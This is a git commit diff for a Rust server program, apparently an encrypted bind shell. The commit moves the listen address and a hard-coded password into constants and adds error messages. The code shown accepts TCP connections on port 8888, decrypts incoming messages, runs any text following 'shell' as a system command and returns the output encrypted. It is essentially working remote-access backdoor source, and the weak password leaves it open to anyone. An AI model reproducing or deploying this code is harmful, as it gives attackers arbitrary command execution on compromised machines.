24bd88f6a79d3480fac6c4f49a2de13f47c30c16
UncleSp1d3r <unclespider@protonmail.com>
2023-02-10 18:50:38 -0500

    Moved the server values into constants and added some error messages
    Signed-off-by: UncleSp1d3r <unclespider@protonmail.com>

--- src/server.rs
+++ src/server.rs
@@ -5,23 +5,26 @@ use std::process::{Command, Stdio};
 
 mod common;
 
+const PASSWORD: &str = "password";
+const SERVER_ADDR: &str = "0.0.0.0:8888";
+
 fn handle_client(mut stream: std::net::TcpStream) {
     let mut buffer = [0u8; 65536];
     let mut nonce = [0u8; common::NONCE_LEN];
-    let password = "password";
-    let key = common::derive_key(password);
+    let key = common::derive_key(PASSWORD);
 
     stream.read_exact(&mut nonce).unwrap();
     let nonce = Nonce::from_slice(&nonce);
 
     loop {
-        let n = stream.read(&mut buffer).unwrap();
+        let n = stream.read(&mut buffer).expect("Failed to read");
         if n == 0 {
             break;
         }
 
-        let plaintext = common::decrypt_data(&buffer[..n], &key, &nonce).unwrap();
-        let plaintext = String::from_utf8(plaintext).unwrap();
+        let plaintext = common::decrypt_data(&buffer[..n], &key, nonce).expect("Failed to decrypt");
+        let plaintext = String::from_utf8(plaintext).expect("Failed to convert to string");
+        // trunk-ignore(clippy/needless_late_init)
         let output: Vec<u8>;
         if plaintext.starts_with("shell") {
             let command = &plaintext[6..];
@@ -31,20 +34,20 @@ fn handle_client(mut stream: std::net::TcpStream) {
                 .stdout(Stdio::piped())
                 .stderr(Stdio::piped())
                 .output()
-                .unwrap();
+                .expect("Failed to execute command");
             output = cmd_output.stdout;
         } else {
             output = plaintext.as_bytes().to_vec();
         }
 
-        let ciphertext = common::encrypt_data(&output, &key, &nonce).unwrap();
-        stream.write_all(&ciphertext).unwrap();
-        stream.flush().unwrap();
+        let ciphertext = common::encrypt_data(&output, &key, nonce).expect("Failed to encrypt");
+        stream.write_all(&ciphertext).expect("Failed to write");
+        stream.flush().expect("Failed to flush");
     }
 }
 
 fn main() {
-    let listener = TcpListener::bind("0.0.0.0:8888").unwrap();
+    let listener = TcpListener::bind(SERVER_ADDR).expect("Failed to bind");
 
     for stream in listener.incoming() {
         match stream {
